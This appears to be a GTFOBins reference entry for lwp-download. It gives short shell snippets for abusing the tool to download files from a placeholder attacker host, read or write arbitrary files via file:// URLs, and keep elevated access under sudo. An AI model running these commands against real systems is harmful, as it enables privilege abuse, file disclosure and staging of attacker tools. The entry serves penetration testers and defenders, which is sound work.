# GTFOBin: lwp-download

Fetch a remote file via HTTP GET request.

## File download

It can download remote files.

```
URL=http://attacker.com/file_to_get
LFILE=file_to_save
lwp-download $URL $LFILE
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
lwp-download file://$TF $LFILE
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file path must be absolute.

```
LFILE=file_to_read
TF=$(mktemp)
lwp-download "file://$LFILE" $TF
cat $TF
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo lwp-download $URL $LFILE
```